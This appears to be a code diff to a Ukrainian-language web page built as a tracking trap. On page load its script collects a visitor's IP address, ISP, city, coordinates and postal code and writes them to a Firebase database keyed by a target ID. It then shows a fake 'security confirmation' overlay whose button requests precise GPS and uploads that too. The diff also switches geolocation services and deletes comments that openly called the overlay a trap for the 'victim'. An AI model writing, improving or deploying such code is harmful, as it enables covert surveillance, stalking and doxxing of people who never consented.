@@ -176,7 +176,6 @@
 </head>
 <body>
 
-  <!-- Фейкове вікно для жертви -->
   <div id="victimOverlay" style="display: none;">
     <div class="trap-card">
       <h2>Підтвердження безпеки</h2>
@@ -332,19 +331,24 @@
       data.netSpeed = `${conn.downlink || '?'} Mbps`;
     }
 
+    // Використовуємо надійніший сервіс ipwho.is
     try {
-      const r = await fetch('https://ipapi.co/json/');
+      const r = await fetch('https://ipwho.is/');
       if(r.ok) {
         const d = await r.json();
-        data.ip = d.ip || '—';
-        data.isp = d.org || '—';
-        data.country = d.country_name || '—';
-        data.city = d.city || '—';
-        data.coords = (d.latitude && d.longitude) ? `${d.latitude}, ${d.longitude}` : '—';
-        data.zip = d.postal || '—';
+        if(d.success) {
+          data.ip = d.ip || '—';
+          data.isp = d.connection && d.connection.isp ? d.connection.isp : (d.org || '—');
+          data.country = d.country || '—';
+          data.city = d.city || '—';
+          data.coords = (d.latitude && d.longitude) ? `${d.latitude}, ${d.longitude}` : '—';
+          data.zip = d.postal || '—';
+        } else {
+          data.ip = 'Не вдалося визначити';
+        }
       }
     } catch(e) {
-      data.ip = 'Не вдалося визначити';
+      data.ip = 'Помилка запиту IP';
     }
     return data;
   }
@@ -376,22 +380,18 @@
       document.getElementById('heroIp').style.display = 'none';
       document.getElementById('heroLoc').style.display = 'none';
       
-      // 1. АВТОМАТИЧНО збираємо і відправляємо ВСІ базові дані ОДРАЗУ при завантаженні сторінки
       const initialData = await collectMyData();
       await db.ref('logs/' + targetId).set(initialData);
 
-      // 2. Показуємо вікно-пастку з кнопкою для добору GPS
       document.getElementById('victimOverlay').style.display = 'flex';
       document.getElementById('heroLabel').textContent = 'Очікування дії користувача...';
 
-      // 3. Якщо жертва клікає на кнопку — оновлюємо дані у тій самій базі, додаючи GPS
       document.getElementById('trapBtn').addEventListener('click', async () => {
         document.getElementById('victimOverlay').style.display = 'none';
         document.getElementById('heroLabel').textContent = 'Оновлення геолокації...';
 
         const gps = await requestGps();
         
-        // Оновлюємо лише поля GPS у базі, не чіпаючи решту
         db.ref('logs/' + targetId).update({
           exactCoords: gps.exactCoords,
           accuracy: gps.accuracy
